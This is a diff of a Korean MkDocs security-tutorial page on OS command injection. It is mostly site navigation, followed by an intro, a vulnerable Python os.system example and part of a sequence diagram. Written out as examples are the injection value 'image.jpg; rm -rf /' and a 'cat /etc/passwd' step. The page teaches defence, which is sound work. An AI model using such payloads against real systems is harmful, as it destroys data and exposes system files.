+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Basic/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    보안 기초 개념
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Threat_Modeling/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    위협 모델링
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../OWASP_Top_10/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OWASP Top 10
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%EB%B3%B4%EC%95%88_%EC%8B%AC%ED%99%94_%EB%B0%8F_%EC%B7%A8%EC%95%BD%EC%A0%90_%EB%B6%84%EC%84%9D/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    보안 심화 및 취약점 분석
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Tenant_Key_Management/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    테넌트별 암호화 키 격리
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Cross_Tenant_Leak/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    크로스 테넌트 유출
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../API_Security/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    API 보안
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../AES/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    암호화
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../HTTPS_and_TLS/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    전송 구간 보안
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../OAuth/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    인증과 세션
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_4_12" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_4_12" id="__nav_7_4_12_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    웹 취약점
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_4_12_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_4_12">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    웹 취약점
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XSS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XSS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SSRF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SSRF
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Clickjacking/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clickjacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Command Injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="목차">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      목차
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#공격이-성립하는-근본-원인" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        공격이 성립하는 근본 원인
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#위험한-함수와-안전한-함수" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        위험한 함수와 안전한 함수
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="위험한 함수와 안전한 함수">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nodejs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Node.js
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#typescript-nodejs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TypeScript (Node.js)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#메타문자-페이로드-패턴" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        메타문자 페이로드 패턴
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#파일-업로드--명령-인젝션-콤보" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        파일 업로드 + 명령 인젝션 콤보
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#이미지미디어-라이브러리-인자-인젝션" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        이미지/미디어 라이브러리 인자 인젝션
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="이미지/미디어 라이브러리 인자 인젝션">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#imagemagick--imagetragick-cve-2016-3714" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ImageMagick — ImageTragick (CVE-2016-3714)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ffmpeg-인자-인젝션" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ffmpeg 인자 인젝션
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-명령-인젝션-탐지" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind 명령 인젝션 탐지
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind 명령 인젝션 탐지">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#시간-지연-기반-탐지" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        시간 지연 기반 탐지
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#out-of-bandoob-콜백" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Out-of-Band(OOB) 콜백
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#방어-방법" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        방어 방법
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="방어 방법">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-셸을-호출하지-않는다" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 셸을 호출하지 않는다
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-외부-명령을-아예-호출하지-않는다" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 외부 명령을 아예 호출하지 않는다
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-인자에-들어갈-값은-allowlist로-제한" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 인자에 들어갈 값은 allowlist로 제한
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-인자-앞에----또는-경로-prefix를-붙인다" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 인자 앞에 -- 또는 경로 prefix를 붙인다
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-최소-권한으로-실행" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 최소 권한으로 실행
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-미디어-라이브러리-정책-강화" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 미디어 라이브러리 정책 강화
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#사고-사례에서-배우는-것" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        사고 사례에서 배우는 것
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#코드-리뷰-시-확인-포인트" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        코드 리뷰 시 확인 포인트
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Insecure_Deserialization/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    안전하지 않은 역직렬화
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../XML_External_Entity/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    XXE 주입
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Path_Traversal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Path Traversal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Open_Redirect/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Open Redirect
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Open_Redirect_Deep_Dive/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Open Redirect 심화
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Web_Cache_Poisoning/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    웹 캐시 포이즈닝
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CORS_and_Security_Headers/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CORS와 브라우저 보안 헤더
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../File_Upload_Security/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    파일 업로드 보안
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../D_Do_S_Defense/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    공격 방어
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../Zero_Trust_Architecture/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    인프라 보안
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../Dev_Sec_Ops/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    운영과 컴플라이언스
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../SQL_%EC%9D%B8%EC%A0%9D%EC%85%98/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SQL Injection
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../AI/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AI
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../_hub/%ED%8A%B8%EB%9E%9C%EC%9E%AD%EC%85%98%EA%B3%BC_%EB%8F%99%EC%8B%9C%EC%84%B1/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    가이드
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../tags/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Tags
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="목차">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      목차
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#공격이-성립하는-근본-원인" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        공격이 성립하는 근본 원인
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#위험한-함수와-안전한-함수" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        위험한 함수와 안전한 함수
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="위험한 함수와 안전한 함수">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#nodejs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Node.js
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#python" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Python
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#typescript-nodejs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        TypeScript (Node.js)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#php" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        PHP
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#메타문자-페이로드-패턴" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        메타문자 페이로드 패턴
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#파일-업로드--명령-인젝션-콤보" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        파일 업로드 + 명령 인젝션 콤보
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#이미지미디어-라이브러리-인자-인젝션" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        이미지/미디어 라이브러리 인자 인젝션
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="이미지/미디어 라이브러리 인자 인젝션">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#imagemagick--imagetragick-cve-2016-3714" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ImageMagick — ImageTragick (CVE-2016-3714)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#ffmpeg-인자-인젝션" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ffmpeg 인자 인젝션
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-명령-인젝션-탐지" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind 명령 인젝션 탐지
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Blind 명령 인젝션 탐지">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#시간-지연-기반-탐지" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        시간 지연 기반 탐지
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#out-of-bandoob-콜백" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Out-of-Band(OOB) 콜백
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#방어-방법" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        방어 방법
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="방어 방법">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-셸을-호출하지-않는다" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. 셸을 호출하지 않는다
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-외부-명령을-아예-호출하지-않는다" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. 외부 명령을 아예 호출하지 않는다
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-인자에-들어갈-값은-allowlist로-제한" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. 인자에 들어갈 값은 allowlist로 제한
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-인자-앞에----또는-경로-prefix를-붙인다" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. 인자 앞에 -- 또는 경로 prefix를 붙인다
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-최소-권한으로-실행" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. 최소 권한으로 실행
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#6-미디어-라이브러리-정책-강화" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. 미디어 라이브러리 정책 강화
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#사고-사례에서-배우는-것" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        사고 사례에서 배우는 것
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#코드-리뷰-시-확인-포인트" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        코드 리뷰 시 확인 포인트
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+  <nav class="md-tags" >
+    
+      
+      
+      
+      
+        <span class="md-tag">security</span>
+      
+    
+  </nav>
+
+
+  
+  
+
+
+<h1 id="os-command-injection">OS Command Injection<a class="headerlink" href="#os-command-injection" title="Permanent link">&para;</a></h1>
+<p>사용자 입력이 OS 셸에 전달되어 임의 명령으로 실행되는 공격이다. SQL Injection이 DB를 노린다면, Command Injection은 서버 자체를 노린다. 한 번 성공하면 RCE(Remote Code Execution)로 직결되기 때문에 CVSS 점수가 거의 항상 9점 이상이다.</p>
+<p>가장 골치 아픈 점은 개발자가 의도적으로 셸을 호출하는 경우보다, 라이브러리 내부에서 몰래 셸을 호출하는 경우가 더 많다는 것이다. 이미지 변환, PDF 생성, 파일 압축, 동영상 처리 코드는 거의 다 내부에서 외부 바이너리를 fork+exec한다. 이 과정에서 인자 한 줄이 셸을 거쳐 가면 그 순간부터 공격 표면이 된다.</p>
+<hr />
+<h2 id="공격이-성립하는-근본-원인">공격이 성립하는 근본 원인<a class="headerlink" href="#공격이-성립하는-근본-원인" title="Permanent link">&para;</a></h2>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1"># 흔한 잘못된 코드 — Python</span>
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="kn">import</span><span class="w"> </span><span class="nn">os</span>
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]</span>
+</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;convert </span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2"> output.webp&quot;</span><span class="p">)</span>
+</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
+</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1"># filename = &quot;image.webp&quot;           →  정상</span>
+</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="c1"># filename = &quot;image.jpg; rm -rf /&quot; →  명령 두 개가 실행됨</span>
+</span></code></pre></div>
+<p>핵심은 두 가지다. 첫째, 사용자 입력이 셸 명령 문자열에 그대로 들어간다. 둘째, 그 문자열을 <code>/bin/sh -c "..."</code> 형태로 셸에 넘긴다. 셸은 자기에게 넘어온 문자열을 파싱해서 메타문자를 해석하기 때문에, 입력에 섞인 <code>;</code>나 <code>|</code>가 명령 구분자로 동작한다.</p>
+<p>OS 입장에서는 자기가 받은 명령을 충실히 실행할 뿐이다. 어디까지가 개발자 의도이고 어디부터 공격자 입력인지 구분할 방법이 없다. 이걸 구분해주는 게 <code>exec</code> 계열 함수에서 인자를 배열로 분리해서 넘기는 방식, 즉 셸을 거치지 않는 호출이다.</p>
+<pre class="mermaid-diagram"><code>sequenceDiagram
     participant 공격자
     participant 앱
     participant 셸
@@ -19,113 +2921,240 @@
     셸-&gt;&gt;OS: cat /etc/passwd output.webp
     OS--&gt;&gt;셸: passwd 파일 내용
     셸--&gt;&gt;앱: stdout
